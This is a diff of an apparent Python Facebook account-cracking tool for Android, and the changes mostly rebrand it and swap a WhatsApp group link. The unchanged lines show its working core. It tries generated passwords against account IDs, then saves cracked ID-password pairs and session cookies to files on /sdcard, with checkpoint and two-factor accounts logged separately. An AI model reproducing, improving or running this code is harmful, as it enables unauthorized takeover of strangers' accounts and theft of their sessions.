@@ -50,7 +50,7 @@ def menu():
     lomda = input('\033[1;37m   Choose Option : ')
     if lomda in ['1']:
         clear()
-        print('  PUT FILE EXAMPLE :  /sdcard/filename.txt')
+        print('   📁 :  /sdcard/filename.txt')
         linex()
         file = input('   Enter File Name\033[1;37m: ')
         try:
@@ -103,14 +103,14 @@ def menu():
         input(' PRESS ENTER TO BACK ')
         os.system('python ROCKY.py')
     elif lomda in ['2']:
-            os.system('https://chat.whatsapp.com/IjLRadygoVqD0CO9sTBvIY')
+            os.system('https://chat.whatsapp.com/GOBJZdlxr0Z30Zr2ZhQ6S7')
     else:
         menu()
 
 def ffb(ids,names,passlist):
         try:
                 global oks,loop
-                sys.stdout.write('\r\r\033[1;37m [CHRISE-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [Anaya-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -164,17 +164,17 @@ def ffb(ids,names,passlist):
                         if 'session_key' in po:
                                         print('\r\r\033[1;32m [Successful] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        open('/sdcard/ROCKY-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
-                                        open('/sdcard/ROCKY-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/Anaya-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                                        open('/sdcard/Anaya-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
-                                                print('\r\r \033[1;33m[CHRISE-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;33m[Anaya-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                                 print('\r\r\x1b[1;31m [CHECKPOINT] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/ROCKY-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/Anaya-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                         else:
